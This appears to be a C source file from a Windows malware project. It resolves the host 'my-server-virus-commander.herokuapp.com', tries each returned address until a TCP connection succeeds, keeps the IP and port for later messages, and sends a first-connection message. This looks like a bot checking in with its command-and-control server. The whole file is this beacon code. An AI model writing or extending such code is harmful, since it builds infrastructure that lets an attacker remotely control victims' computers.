#include "Connection.h"

char SOCKET_IP[16];
int SOCKET_PORT = 0;


int make_connection()
{
    WSADATA wsaData;
    struct sockaddr_in clientService;
    int iResult = 0;
    SOCKET ConnectSocket;

    // for getaddrinfo function
    struct addrinfo* result = NULL;
    struct addrinfo* ptr = NULL;
    struct addrinfo hints;

    struct sockaddr_in* sockaddr_ipv4;
    LPSOCKADDR sockaddr_ip;

    char ipstringbuffer[46];
    DWORD ipbufferlength = 46;


    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != NO_ERROR) {
        wprintf(L"WSAStartup function failed with error: %d\n", iResult);
        return 1;
    }


    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        wprintf(L"socket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    //--------------------------------
    // Setup the hints address info structure
    // which is passed to the getaddrinfo() function
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;


    //--------------------------------
    // Call getaddrinfo(). If the call succeeds,
    // the result variable will hold a linked list
    // of addrinfo structures containing response
    // information
    iResult = getaddrinfo("my-server-virus-commander.herokuapp.com", "http", &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    printf("getaddrinfo returned success\n");




    ////////////////////////

    /*clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr(SOCKET_IP);
    clientService.sin_port = htons(SOCKET_PORT);*/

    // Retrieve each address and print out the hex bytes
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
    {
        switch (ptr->ai_family)
        {
        case AF_INET:
            printf("AF_INET (IPv4)\n");
            sockaddr_ipv4 = (struct sockaddr_in*) ptr->ai_addr;
            printf("\tIPv4 address %s\n", inet_ntoa(sockaddr_ipv4->sin_addr));

            strncpy(ipstringbuffer, inet_ntoa(sockaddr_ipv4->sin_addr), strlen(inet_ntoa(sockaddr_ipv4->sin_addr)));

            // adding null byte in the end.
            ipstringbuffer[strlen(inet_ntoa(sockaddr_ipv4->sin_addr))] = '\0';

            printf("%s:%d \n", ipstringbuffer, sockaddr_ipv4->sin_port);
            // if founded a good ip - try to connect.
            clientService.sin_family = AF_INET;
            clientService.sin_addr.s_addr = inet_addr(ipstringbuffer); // the ip
            clientService.sin_port = (sockaddr_ipv4->sin_port); // the port

            // initializing the global variables for the ip and port connection to send and recv the masseges.
            strncpy(SOCKET_IP, ipstringbuffer, sizeof(SOCKET_IP));
            SOCKET_PORT = sockaddr_ipv4->sin_port;

            printf("%s:%d \n", (ipstringbuffer), (sockaddr_ipv4->sin_port));

            iResult = connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
            if (iResult == SOCKET_ERROR) {
                /*printf("connect function failed with error: %ld\n", WSAGetLastError());
                iResult = closesocket(*ConnectSocket);
                if (iResult == SOCKET_ERROR)
                    printf("closesocket function failed with error: %ld\n", WSAGetLastError());
                WSACleanup();
                return -1;*/
                printf("Current ip and port are invalid! \n");
            }
            else
            {
                // if founded good ip and port, and connected successfully - finish the loop.
                printf("Founded ip and port to connect! \n");
                ptr = NULL;
            }

            break;

        default:
            break;
        }

        // if connection has made - stop looking for other connections.
        if (ptr == NULL)
            break;

    }

    printf("sending:\n'%s'\n", FIRST_CONNECTION_POST_MSG);

    // send the post packet
    iResult = send(
        ConnectSocket,
        FIRST_CONNECTION_POST_MSG,
        strlen(FIRST_CONNECTION_POST_MSG),
        NULL
    );

    if (iResult == SOCKET_ERROR || iResult == 0)
    {
        printf("Problem sending the first connection message! \n");
        return -1;
    }



    iResult = closesocket(ConnectSocket);
    if (iResult == SOCKET_ERROR) {
        wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    WSACleanup();
    return 0;
}